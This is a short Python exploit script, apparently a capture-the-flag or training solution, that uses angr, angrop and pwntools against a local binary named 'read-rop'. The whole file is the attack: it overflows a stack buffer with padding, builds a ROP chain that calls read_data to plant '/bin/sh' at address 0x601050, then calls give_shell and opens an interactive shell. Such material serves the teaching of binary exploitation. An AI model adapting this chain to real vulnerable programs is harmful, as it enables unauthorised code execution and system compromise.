import angr
import angrop
from pwn import *

r = process("./read-rop")

# Create angr "project" on the binary
p = angr.Project("read-rop")

# Tell angrop to analyze it and find gadgets
rop = p.analyses.ROP()
rop.find_gadgets()

r.recvuntil("Hahaha, there's no \"/bin/sh\" to save you now!\n")

# ROP chain construction

# padding for reaching the return address
padding = ("a" * 8) + ("a" * 8)

# Call read_data(seemingly_useless_buffer, 8)
# We will use this to create our "/bin/sh" string
chain = rop.func_call("read_data", [0x601050, 8])

# Call give_shell(seemingly_useless_buffer)
# This is equivalent to give_shell("/bin/sh")
# because we will put "/bin/sh" into seemingly_useless_buffer
chain += rop.func_call("give_shell", [0x601050])

# Create the final payload
# (angrop doesn't determine how much padding we will need)
payload = padding + chain.payload_str()

# Send the payload
r.sendline(payload)

# Send the "/bin/sh" string that will be read into the buffer
r.sendline("/bin/sh")

# Shell!
r.interactive()
